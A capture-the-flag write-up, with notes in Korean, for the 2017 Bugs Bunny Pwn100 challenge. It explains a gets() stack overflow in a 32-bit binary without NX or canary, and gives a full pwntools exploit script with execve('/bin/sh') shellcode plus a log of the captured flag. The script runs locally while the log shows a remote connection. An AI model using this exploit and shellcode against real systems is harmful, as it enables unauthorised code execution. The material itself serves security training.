# 2017 bugsbunny - [PWN] Pwn100

## Key words

- i386
- return to shellcode

## Check Security

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

## Solution

```c
char *docopy()
{
  char s; // [sp+10h] [bp-18h]@1

  return gets(&s);
}
```

간단히 오버플로우가 발생합니다. 한 가지 주의할 점은 `gets`로 입력을 받기 때문에 `\x00`등을 만나면 문자열 받는 것을 멈추게 됩니다. 이 때문에 `bss`영역을 하나 더해서 `0x0804a001`을 만들어 주어 문자열이 멈추게 되는것을 피했습니다.

`bss` 영역에 32비트 쉘 코드를 올리고 그 쪽으로 점프를 해서 쉘을 얻었습니다.

## Exploit Code
```python
from pwn import *

target = "./pwn100"

p = process(target)

bss = 0x0804a001
plt_gets = 0x080482f0
pr = 0x080484af

payload = "A" * 0x18
payload += "A" * 4
payload += p32(plt_gets)
payload += p32(pr)
payload += p32(bss)
payload += p32(bss)

p.sendline(payload)

payload = "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

p.sendline(payload)

p.interactive()
```

## Result
```
tbkim@ubuntu:~/ctf/pwnable/0013_2017_bugsbunny_pwn100$ python sol_pwn100.py 
[+] Opening connection to 54.67.102.66 on port 5252: Done
Bugs_Bunny{ohhhh_you_look_you_are_gooD_hacker_Maybe_Iknow_you:p}

[*] Closed connection to 54.67.102.66 port 5252
```
